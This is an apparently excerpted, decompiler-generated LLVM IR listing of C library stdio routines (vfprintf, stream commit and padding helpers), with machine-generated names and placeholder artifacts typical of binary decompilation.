  store i32 %v1_804e332, i32* %eax.global-to-local, align 4
  %v1_804e33a = icmp eq i32 %v1_804e332, 0
  br i1 %v1_804e33a, label %dec_label_pc_804e352, label %dec_label_pc_804e33e

dec_label_pc_804e33e:                             ; preds = %dec_label_pc_804e32b
  %v0_804e33e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e33e = add i32 %v0_804e33e, 8
  %v2_804e33e = inttoptr i32 %v1_804e33e to i32*
  %v3_804e33e = load i32, i32* %v2_804e33e, align 4
  store i32 %v3_804e33e, i32* %eax.global-to-local, align 4
  %v1_804e341 = inttoptr i32 %v0_804e33e to i16*
  store i16 48, i16* %v1_804e341, align 2
  %v0_804e346 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e346 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e346 = add i32 %v1_804e346, 24
  %v3_804e346 = inttoptr i32 %v2_804e346 to i32*
  store i32 %v0_804e346, i32* %v3_804e346, align 4
  %v0_804e349 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e349 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e349 = add i32 %v1_804e349, 28
  %v3_804e349 = inttoptr i32 %v2_804e349 to i32*
  store i32 %v0_804e349, i32* %v3_804e349, align 4
  %v0_804e34c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e34c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e34c = add i32 %v1_804e34c, 16
  %v3_804e34c = inttoptr i32 %v2_804e34c to i32*
  store i32 %v0_804e34c, i32* %v3_804e34c, align 4
  %v0_804e34f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e34f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e34f = add i32 %v1_804e34f, 20
  %v3_804e34f = inttoptr i32 %v2_804e34f to i32*
  store i32 %v0_804e34f, i32* %v3_804e34f, align 4
  br label %dec_label_pc_804e352

dec_label_pc_804e352:                             ; preds = %dec_label_pc_804e32b, %dec_label_pc_804e33e
  %v0_804e355 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e355 = add i32 %v0_804e355, 52
  %v2_804e355 = inttoptr i32 %v1_804e355 to i32*
  store i32 1, i32* %v2_804e355, align 4
  %v0_804e35c = load i32, i32* @esi, align 4
  %v1_804e35d = call i32 @__stdio_init_mutex(i32 %v0_804e35c)
  store i32 %v1_804e35d, i32* %eax.global-to-local, align 4
  %v0_804e362 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e362 = add i32 %v0_804e362, 32
  %v2_804e362 = inttoptr i32 %v1_804e362 to i32*
  %storemerge = load i32, i32* %v2_804e362, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e368 = icmp eq i32 %storemerge, 0
  %v1_804e36a = icmp eq i1 %v1_804e368, false
  br i1 %v1_804e36a, label %dec_label_pc_804e32b, label %dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge

dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge: ; preds = %dec_label_pc_804e352
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80551c4.101 to i32*), align 4
  br label %dec_label_pc_804e388.preheader

dec_label_pc_804e388.preheader:                   ; preds = %dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e3883 = icmp eq i32 %storemerge12, 0
  %v1_804e38a10 = icmp eq i1 %v1_804e3883, false
  br i1 %v1_804e38a10, label %dec_label_pc_804e374.preheader, label %dec_label_pc_804e38c

dec_label_pc_804e374.preheader:                   ; preds = %dec_label_pc_804e388.preheader
  br label %dec_label_pc_804e374

dec_label_pc_804e374:                             ; preds = %dec_label_pc_804e374.preheader, %dec_label_pc_804e385
  %v0_804e37c = phi i32 [ %storemerge1, %dec_label_pc_804e385 ], [ %storemerge12, %dec_label_pc_804e374.preheader ]
  %v1_804e374 = inttoptr i32 %v0_804e37c to i8*
  %v2_804e374 = load i8, i8* %v1_804e374, align 1
  %v3_804e374 = and i8 %v2_804e374, 64
  %v4_804e374 = icmp eq i8 %v3_804e374, 0
  br i1 %v4_804e374, label %dec_label_pc_804e385, label %dec_label_pc_804e379

dec_label_pc_804e379:                             ; preds = %dec_label_pc_804e374
  %v1_804e37d = call i32 @__stdio_wcommit(i32 %v0_804e37c)
  store i32 %v1_804e37d, i32* %eax.global-to-local, align 4
  %v0_804e385.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e385

dec_label_pc_804e385:                             ; preds = %dec_label_pc_804e374, %dec_label_pc_804e379
  %v0_804e385 = phi i32 [ %v0_804e37c, %dec_label_pc_804e374 ], [ %v0_804e385.pre, %dec_label_pc_804e379 ]
  %v1_804e385 = add i32 %v0_804e385, 32
  %v2_804e385 = inttoptr i32 %v1_804e385 to i32*
  %storemerge1 = load i32, i32* %v2_804e385, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e388 = icmp eq i32 %storemerge1, 0
  %v1_804e38a = icmp eq i1 %v1_804e388, false
  br i1 %v1_804e38a, label %dec_label_pc_804e374, label %dec_label_pc_804e38c

dec_label_pc_804e38c:                             ; preds = %dec_label_pc_804e385, %dec_label_pc_804e388.preheader
  %v2_804e38c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e38c, i32* %eax.global-to-local, align 4
  %v2_804e38d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e38d, i32* @ebx, align 4
  store i32 %v0_804e308, i32* @esi, align 4
  ret i32 %v2_804e38c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* @global_var_8055200.94, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e385, { 1, 0 }
  uselistorder label %dec_label_pc_804e374, { 1, 0 }
  uselistorder label %dec_label_pc_804e352, { 1, 0 }
  uselistorder label %dec_label_pc_804e32b, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e390 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e398 = add i32 %arg1, 8
  %v2_804e398 = inttoptr i32 %v1_804e398 to i32*
  %v3_804e398 = load i32, i32* %v2_804e398, align 4
  store i32 %v3_804e398, i32* %edx.global-to-local, align 4
  %v1_804e39b = add i32 %arg1, 16
  %v2_804e39b = inttoptr i32 %v1_804e39b to i32*
  %v3_804e39b = load i32, i32* %v2_804e39b, align 4
  %v2_804e39e = sub i32 %v3_804e39b, %v3_804e398
  %v12_804e39e = icmp eq i32 %v2_804e39e, 0
  store i32 %v2_804e39e, i32* %eax.global-to-local, align 4
  br i1 %v12_804e39e, label %dec_label_pc_804e3b1, label %dec_label_pc_804e3a2

dec_label_pc_804e3a2:                             ; preds = %entry
  store i32 %v3_804e398, i32* %v2_804e39b, align 4
  %v0_804e3a5 = load i32, i32* @ecx, align 4
  %v0_804e3a6 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e3a7 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e3a8 = load i32, i32* @ebx, align 4
  %v4_804e3a9 = inttoptr i32 %v0_804e3a8 to i16*
  %v5_804e3a9 = call i32 @__stdio_WRITE(i16* %v4_804e3a9, i32 %v0_804e3a7, i32 %v0_804e3a6, i32 %v0_804e3a5)
  store i32 %v5_804e3a9, i32* %eax.global-to-local, align 4
  %v0_804e3b1.pre = load i32, i32* @ebx, align 4
  %v2_804e3b7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e3b1

dec_label_pc_804e3b1:                             ; preds = %entry, %dec_label_pc_804e3a2
  %v2_804e3b7 = phi i32 [ %tmp11, %entry ], [ %v2_804e3b7.pre, %dec_label_pc_804e3a2 ]
  %v0_804e3b1 = phi i32 [ %arg1, %entry ], [ %v0_804e3b1.pre, %dec_label_pc_804e3a2 ]
  %v1_804e3b1 = add i32 %v0_804e3b1, 16
  %v2_804e3b1 = inttoptr i32 %v1_804e3b1 to i32*
  %v3_804e3b1 = load i32, i32* %v2_804e3b1, align 4
  store i32 %v3_804e3b1, i32* %eax.global-to-local, align 4
  %v2_804e3b4 = add i32 %v0_804e3b1, 8
  %v3_804e3b4 = inttoptr i32 %v2_804e3b4 to i32*
  %v4_804e3b4 = load i32, i32* %v3_804e3b4, align 4
  %v5_804e3b4 = sub i32 %v3_804e3b1, %v4_804e3b4
  store i32 %v5_804e3b4, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3b7, i32* @edx, align 4
  store i32 %v0_804e390, i32* @ebx, align 4
  ret i32 %v5_804e3b4

; uselistorder directives
  uselistorder i32 %v0_804e3b1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e3b1, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_804e3bf = ptrtoint i32* %stack_var_-28 to i32
  %v4_804e3c2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e3c2, i32* @esi, align 4
  %v1_804e3c6 = add i32 %v4_804e3c2, 52
  %v2_804e3c6 = inttoptr i32 %v1_804e3c6 to i32*
  %v3_804e3c6 = load i32, i32* %v2_804e3c6, align 4
  store i32 %v3_804e3c6, i32* @edi, align 4
  %v1_804e3c9 = icmp eq i32 %v3_804e3c6, 0
  %v1_804e3cb = icmp eq i1 %v1_804e3c9, false
  br i1 %v1_804e3cb, label %dec_label_pc_804e3ec, label %dec_label_pc_804e3cd

dec_label_pc_804e3cd:                             ; preds = %entry
  %v1_804e3cd = add i32 %v4_804e3c2, 56
  store i32 %v1_804e3cd, i32* @ebx, align 4
  store i32 %v12_804e3bf, i32* @eax, align 4
  %v3_804e3dc = call i32 @__pthread_return_void(i32 %v12_804e3bf, i32 134548959)
  %v0_804e3e1 = load i32, i32* @ebx, align 4
  %v2_804e3e4 = call i32 @__pthread_return_0(i32 %v0_804e3e1)
  %v0_804e3ec.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e3ec

dec_label_pc_804e3ec:                             ; preds = %entry, %dec_label_pc_804e3cd
  %v0_804e402 = phi i32 [ %v4_804e3c2, %entry ], [ %v0_804e3ec.pre, %dec_label_pc_804e3cd ]
  %v1_804e3ec = inttoptr i32 %v0_804e402 to i16*
  %v2_804e3ec = load i16, i16* %v1_804e3ec, align 2
  %v1_804e3ef = and i16 %v2_804e3ec, 192
  %v6_804e3f4 = icmp eq i16 %v1_804e3ef, 192
  br i1 %v6_804e3f4, label %dec_label_pc_804e3ec.dec_label_pc_804e412_crit_edge, label %dec_label_pc_804e3fb

dec_label_pc_804e3ec.dec_label_pc_804e412_crit_edge: ; preds = %dec_label_pc_804e3ec
  br label %dec_label_pc_804e412

dec_label_pc_804e3fb:                             ; preds = %dec_label_pc_804e3ec
  %v0_804e3fb = load i32, i32* @ecx, align 4
  %v6_804e403 = call i32 @__stdio_trans2w_o(i16* %v1_804e3ec, i32 128, i32 %v0_804e3fb, i32 %v0_804e3fb)
  store i32 -1, i32* @ebx, align 4
  %v1_804e40e = icmp eq i32 %v6_804e403, 0
  %v1_804e410 = icmp eq i1 %v1_804e40e, false
  br i1 %v1_804e410, label %dec_label_pc_804e426, label %dec_label_pc_804e3fb.dec_label_pc_804e412_crit_edge

dec_label_pc_804e3fb.dec_label_pc_804e412_crit_edge: ; preds = %dec_label_pc_804e3fb
  %v0_804e41b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e412

dec_label_pc_804e412:                             ; preds = %dec_label_pc_804e3ec.dec_label_pc_804e412_crit_edge, %dec_label_pc_804e3fb.dec_label_pc_804e412_crit_edge
  %v0_804e41b = phi i32 [ %v0_804e402, %dec_label_pc_804e3ec.dec_label_pc_804e412_crit_edge ], [ %v0_804e41b.pre, %dec_label_pc_804e3fb.dec_label_pc_804e412_crit_edge ]
  %v0_804e412 = load i32, i32* @edx, align 4
  %v5_804e41c = inttoptr i32 %arg2 to i8*
  %v6_804e41c = call i32 @_vfprintf_internal(i32 %v0_804e41b, i8* %v5_804e41c, i32 %arg3, i32 %v0_804e412)
  store i32 %v6_804e41c, i32* @ebx, align 4
  br label %dec_label_pc_804e426

dec_label_pc_804e426:                             ; preds = %dec_label_pc_804e3fb, %dec_label_pc_804e412
  %v0_804e43e8 = phi i32 [ -1, %dec_label_pc_804e3fb ], [ %v6_804e41c, %dec_label_pc_804e412 ]
  br i1 %v1_804e3cb, label %dec_label_pc_804e43b, label %dec_label_pc_804e42a

dec_label_pc_804e42a:                             ; preds = %dec_label_pc_804e426
  store i32 %v12_804e3bf, i32* @eax, align 4
  %v3_804e433 = call i32 @__pthread_return_void(i32 %v12_804e3bf, i32 1)
  %v0_804e43e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e43b

dec_label_pc_804e43b:                             ; preds = %dec_label_pc_804e426, %dec_label_pc_804e42a
  %v0_804e43e = phi i32 [ %v0_804e43e8, %dec_label_pc_804e426 ], [ %v0_804e43e.pre, %dec_label_pc_804e42a ]
  ret i32 %v0_804e43e

; uselistorder directives
  uselistorder i32 %v12_804e3bf, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804e43b, { 1, 0 }
  uselistorder label %dec_label_pc_804e426, { 1, 0 }
  uselistorder label %dec_label_pc_804e412, { 1, 0 }
  uselistorder label %dec_label_pc_804e3ec, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e444 = load i32, i32* @edi, align 4
  %v0_804e445 = load i32, i32* @esi, align 4
  %v0_804e446 = load i32, i32* @ebx, align 4
  %v0_804e447 = load i32, i32* @eax, align 4
  store i32 %v0_804e447, i32* @edi, align 4
  %v0_804e44c = load i32, i32* @ecx, align 4
  store i32 %v0_804e44c, i32* @esi, align 4
  store i32 %v0_804e44c, i32* @ebx, align 4
  %v0_804e450 = load i32, i32* @edx, align 4
  store i32 %v0_804e450, i32* %stack_var_-13, align 4
  %v1_804e4572 = icmp eq i32 %v0_804e44c, 0
  br i1 %v1_804e4572, label %dec_label_pc_804e46f, label %dec_label_pc_804e45b.lr.ph

dec_label_pc_804e45b.lr.ph:                       ; preds = %entry
  %v2_804e45b = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e45b

dec_label_pc_804e456:                             ; preds = %dec_label_pc_804e45b
  %v1_804e456 = add i32 %v0_804e456, -1
  %v8_804e456 = icmp eq i32 %v1_804e456, 0
  store i32 %v1_804e456, i32* @ebx, align 4
  br i1 %v8_804e456, label %dec_label_pc_804e46f.loopexit, label %dec_label_pc_804e456.dec_label_pc_804e45b_crit_edge

dec_label_pc_804e456.dec_label_pc_804e45b_crit_edge: ; preds = %dec_label_pc_804e456
  %v0_804e45f.pre = load i32, i32* @edx, align 4
  %v0_804e460.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e45b

dec_label_pc_804e45b:                             ; preds = %dec_label_pc_804e456.dec_label_pc_804e45b_crit_edge, %dec_label_pc_804e45b.lr.ph
  %v0_804e460 = phi i32 [ %v0_804e460.pre, %dec_label_pc_804e456.dec_label_pc_804e45b_crit_edge ], [ %v0_804e447, %dec_label_pc_804e45b.lr.ph ]
  %v0_804e45f = phi i32 [ %v0_804e45f.pre, %dec_label_pc_804e456.dec_label_pc_804e45b_crit_edge ], [ %v0_804e450, %dec_label_pc_804e45b.lr.ph ]
  %v4_804e464 = call i32 @__stdio_fwrite(i32 %v2_804e45b, i32 1, i32 %v0_804e460, i32 %v0_804e45f)
  %v8_804e46c = icmp eq i32 %v4_804e464, 1
  %v0_804e456 = load i32, i32* @ebx, align 4
  br i1 %v8_804e46c, label %dec_label_pc_804e456, label %dec_label_pc_804e46f.loopexit

dec_label_pc_804e46f.loopexit:                    ; preds = %dec_label_pc_804e456, %dec_label_pc_804e45b
  %v1_804e46f.ph = phi i32 [ %v0_804e456, %dec_label_pc_804e45b ], [ 0, %dec_label_pc_804e456 ]
  %v0_804e46f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e46f

dec_label_pc_804e46f:                             ; preds = %dec_label_pc_804e46f.loopexit, %entry
  %v0_804e46f = phi i32 [ 0, %entry ], [ %v0_804e46f.pre, %dec_label_pc_804e46f.loopexit ]
  %v1_804e46f = phi i32 [ 0, %entry ], [ %v1_804e46f.ph, %dec_label_pc_804e46f.loopexit ]
  %v2_804e46f = sub i32 %v0_804e46f, %v1_804e46f
  store i32 %v0_804e446, i32* @ebx, align 4
  store i32 %v0_804e445, i32* @esi, align 4
  store i32 %v0_804e444, i32* @edi, align 4
  ret i32 %v2_804e46f

; uselistorder directives
  uselistorder i32 %v1_804e456, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e46f.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e48d = trunc i32 %arg2 to i8
  %v5_804e48d = icmp slt i8 %v3_804e48d, 0
  %v1_804e48f = icmp eq i1 %v5_804e48d, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e48f, label %dec_label_pc_804e4c0, label %dec_label_pc_804e491

dec_label_pc_804e491:                             ; preds = %entry
  %v3_804e498 = call i32 @strlen(i8* %arg4)
  %v0_804e4a0 = load i32, i32* @ebx, align 4
  %v2_804e4a0 = sub i32 %v0_804e4a0, %v3_804e498
  store i32 %v2_804e4a0, i32* @ebx, align 4
  store i32 %v3_804e498, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e4a0, 1
  br i1 %tmp23, label %dec_label_pc_804e4be, label %dec_label_pc_804e4a8

dec_label_pc_804e4a8:                             ; preds = %dec_label_pc_804e491
  %v0_804e4a8 = load i32, i32* @edi, align 4
  %v1_804e4a8 = urem i32 %v0_804e4a8, 128
  store i32 %v1_804e4a8, i32* @edi, align 4
  store i32 %v2_804e4a0, i32* @ecx, align 4
  store i32 %v1_804e4a8, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804e4b3 = call i32 @_charpad()
  store i32 %v0_804e4b3, i32* @ebp, align 4
  %v12_804e4ba = icmp eq i32 %v0_804e4b3, %v2_804e4a0
  %v1_804e4bc = icmp eq i1 %v12_804e4ba, false
  br i1 %v1_804e4bc, label %dec_label_pc_804e4da, label %dec_label_pc_804e4a8.dec_label_pc_804e4be_crit_edge

dec_label_pc_804e4a8.dec_label_pc_804e4be_crit_edge: ; preds = %dec_label_pc_804e4a8
  %v0_804e4be.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e4be

dec_label_pc_804e4be:                             ; preds = %dec_label_pc_804e4a8.dec_label_pc_804e4be_crit_edge, %dec_label_pc_804e491
  %v0_804e4be = phi i32 [ %v0_804e4be.pre, %dec_label_pc_804e4a8.dec_label_pc_804e4be_crit_edge ], [ %v3_804e498, %dec_label_pc_804e491 ]
  store i32 %v0_804e4be, i32* @ebx, align 4
  br label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %entry, %dec_label_pc_804e4be
  %v0_804e4cb = phi i32 [ %arg3, %entry ], [ %v0_804e4be, %dec_label_pc_804e4be ]
  %tmp24 = icmp slt i32 %v0_804e4cb, 1
  br i1 %tmp24, label %dec_label_pc_804e4d8, label %dec_label_pc_804e4c6

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e4c0
  %v0_804e4c6 = load i32, i32* @ecx, align 4
  %v5_804e4d0 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e4cb, i32 %arg1, i32 %v0_804e4c6)
  br label %dec_label_pc_804e4d8

dec_label_pc_804e4d8:                             ; preds = %dec_label_pc_804e4c0, %dec_label_pc_804e4c6
  %v1_804e4d8 = phi i32 [ 0, %dec_label_pc_804e4c0 ], [ %v5_804e4d0, %dec_label_pc_804e4c6 ]
  %v0_804e4d8 = load i32, i32* @ebp, align 4
  %v2_804e4d8 = add i32 %v0_804e4d8, %v1_804e4d8
  br label %dec_label_pc_804e4da

dec_label_pc_804e4da:                             ; preds = %dec_label_pc_804e4a8, %dec_label_pc_804e4d8
  %v0_804e4dd = phi i32 [ %v0_804e4b3, %dec_label_pc_804e4a8 ], [ %v2_804e4d8, %dec_label_pc_804e4d8 ]
  ret i32 %v0_804e4dd

; uselistorder directives
  uselistorder i32 %v0_804e4cb, { 1, 0 }
  uselistorder i32 %v0_804e4b3, { 1, 0, 2 }
  uselistorder i32 %v1_804e4a8, { 1, 0 }
  uselistorder i32 %v2_804e4a0, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e4da, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d8, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c0, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804e4ee = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e4ee, i32* @ebx, align 4
  %v2_804e4f6 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e4f6, i32* @esi, align 4
  %v5_804e4fb = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e4ee)
  store i32 %v5_804e4fb, i32* %eax.global-to-local, align 4
  %v2_804e503 = icmp slt i32 %v5_804e4fb, 0
  %v1_804e505 = icmp eq i1 %v2_804e503, false
  br i1 %v1_804e505, label %dec_label_pc_804e545, label %dec_label_pc_804e507

dec_label_pc_804e507:                             ; preds = %entry
  %v3_804e507 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e507, i32* @ebx, align 4
  %v5_804e50e = inttoptr i32 %v3_804e507 to i8*
  %v3_804e50f = call i32 @strlen(i8* %v5_804e50e)
  store i32 %v3_804e50f, i32* %eax.global-to-local, align 4
  %v1_804e517 = icmp eq i32 %v3_804e50f, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804e517, label %dec_label_pc_804ea7e, label %dec_label_pc_804e526

dec_label_pc_804e526:                             ; preds = %dec_label_pc_804e507
  %v0_804e526 = load i32, i32* @edx, align 4
  %v0_804e52f = load i32, i32* @ebx, align 4
  %v6_804e530 = call i32 @__stdio_fwrite(i32 %v0_804e52f, i32 %v3_804e50f, i32 %arg1, i32 %v0_804e526)
  store i32 %v6_804e530, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804ea7e

dec_label_pc_804e545:                             ; preds = %entry
  %v6_804e54f = call i32 @_ppfs_prepargs(i32 %v2_804e4f6, i32 %arg3, i32 %v5_804e4fb, i32 %v5_804e4fb)
  store i32 %v6_804e54f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e55c = load i32, i32* @ebx, align 4
  store i32 %v0_804e55c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e564

dec_label_pc_804e563:                             ; preds = %dec_label_pc_804e56a
  %v1_804e563 = add i32 %v0_804e572, 1
  store i32 %v1_804e563, i32* @ebx, align 4
  br label %dec_label_pc_804e564.backedge

dec_label_pc_804e564.backedge:                    ; preds = %dec_label_pc_804e563, %dec_label_pc_804ea64, %dec_label_pc_804ea6f
  %v1_804e56e20 = phi i32 [ %v1_804e576, %dec_label_pc_804e563 ], [ %v3_804ea64, %dec_label_pc_804ea64 ], [ %v1_804e5a2, %dec_label_pc_804ea6f ]
  %v0_804e56418 = phi i32 [ %v1_804e563, %dec_label_pc_804e563 ], [ %v3_804ea64, %dec_label_pc_804ea64 ], [ %v1_804ea6f, %dec_label_pc_804ea6f ]
  %v4_804e564.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e564

dec_label_pc_804e564:                             ; preds = %dec_label_pc_804e564.backedge, %dec_label_pc_804e545
  %v1_804e576 = phi i32 [ %v1_804e56e20, %dec_label_pc_804e564.backedge ], [ %v0_804e55c, %dec_label_pc_804e545 ]
  %v0_804e572 = phi i32 [ %v0_804e56418, %dec_label_pc_804e564.backedge ], [ %v0_804e55c, %dec_label_pc_804e545 ]
  %v4_804e564 = phi i32 [ %v4_804e564.pre, %dec_label_pc_804e564.backedge ], [ %v6_804e54f, %dec_label_pc_804e545 ]
  %v1_804e564 = inttoptr i32 %v0_804e572 to i8*
  %v2_804e564 = load i8, i8* %v1_804e564, align 1
  %v3_804e564 = zext i8 %v2_804e564 to i32
  %v5_804e564 = and i32 %v4_804e564, -256
  %v6_804e564 = or i32 %v3_804e564, %v5_804e564
  store i32 %v6_804e564, i32* %eax.global-to-local, align 4
  %v4_804e566 = icmp eq i8 %v2_804e564, 0
  br i1 %v4_804e566, label %dec_label_pc_804e56e, label %dec_label_pc_804e56a

dec_label_pc_804e56a:                             ; preds = %dec_label_pc_804e564
  %v10_804e56a = icmp eq i8 %v2_804e564, 37
  %v1_804e56c = icmp eq i1 %v10_804e56a, false
  br i1 %v1_804e56c, label %dec_label_pc_804e563, label %dec_label_pc_804e56e

dec_label_pc_804e56e:                             ; preds = %dec_label_pc_804e56a, %dec_label_pc_804e564
  %v2_804e56e = sub i32 %v0_804e572, %v1_804e576
  %v12_804e56e = icmp eq i32 %v2_804e56e, 0
  br i1 %v12_804e56e, label %dec_label_pc_804e599, label %dec_label_pc_804e572

dec_label_pc_804e572:                             ; preds = %dec_label_pc_804e56e
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e56e, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_804e56e, 1
  br i1 %tmp67, label %dec_label_pc_804e58e, label %dec_label_pc_804e57c

dec_label_pc_804e57c:                             ; preds = %dec_label_pc_804e572
  %v0_804e57c = load i32, i32* @ebp, align 4
  %v1_804e57c = load i32, i32* @esp, align 4
  %v2_804e57c = add i32 %v1_804e57c, -4
  %v3_804e57c = inttoptr i32 %v2_804e57c to i32*
  store i32 %v0_804e57c, i32* %v3_804e57c, align 4
  %v1_804e57d = add i32 %v1_804e57c, 368
  %v2_804e57d = inttoptr i32 %v1_804e57d to i32*
  %v3_804e57d = load i32, i32* %v2_804e57d, align 4
  %v5_804e57d = add i32 %v1_804e57c, -8
  %v6_804e57d = inttoptr i32 %v5_804e57d to i32*
  store i32 %v3_804e57d, i32* %v6_804e57d, align 4
  %v0_804e584 = load i32, i32* @esi, align 4
  %v2_804e584 = add i32 %v1_804e57c, -12
  %v3_804e584 = inttoptr i32 %v2_804e584 to i32*
  store i32 %v0_804e584, i32* %v3_804e584, align 4
  %v0_804e585 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e585 = add i32 %v1_804e57c, -16
  %v3_804e585 = inttoptr i32 %v2_804e585 to i32*
  store i32 %v0_804e585, i32* %v3_804e585, align 4
  %v0_804e586 = load i32, i32* %stack_var_-364, align 4
  %v4_804e586 = call i32 @__stdio_fwrite(i32 %v0_804e586, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e586, i32* %eax.global-to-local, align 4
  %v1_804e58e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e58e

dec_label_pc_804e58e:                             ; preds = %dec_label_pc_804e572, %dec_label_pc_804e57c
  %v3_804e596 = phi i32 [ %v2_804e56e, %dec_label_pc_804e572 ], [ %v1_804e58e.pre, %dec_label_pc_804e57c ]
  %v0_804e58e = phi i32 [ 0, %dec_label_pc_804e572 ], [ %v4_804e586, %dec_label_pc_804e57c ]
  %v12_804e58e = icmp eq i32 %v0_804e58e, %v3_804e596
  %v1_804e590 = icmp eq i1 %v12_804e58e, false
  %v0_804ea77.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e590, label %dec_label_pc_804ea77, label %dec_label_pc_804e596

dec_label_pc_804e596:                             ; preds = %dec_label_pc_804e58e
  %v1_804e596 = inttoptr i32 %v0_804ea77.pre.pre to i32*
  %v2_804e596 = load i32, i32* %v1_804e596, align 4
  %v4_804e596 = add i32 %v2_804e596, %v3_804e596
  store i32 %v4_804e596, i32* %v1_804e596, align 4
  %v0_804e599.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e599

dec_label_pc_804e599:                             ; preds = %dec_label_pc_804e56e, %dec_label_pc_804e596
  %v0_804ea6f = phi i32 [ %v0_804e572, %dec_label_pc_804e56e ], [ %v0_804e599.pre, %dec_label_pc_804e596 ]
  %v1_804e599 = inttoptr i32 %v0_804ea6f to i8*
  %v2_804e599 = load i8, i8* %v1_804e599, align 1
  %v3_804e599 = icmp eq i8 %v2_804e599, 0
  br i1 %v3_804e599, label %dec_label_pc_804ea7e, label %dec_label_pc_804e5a2
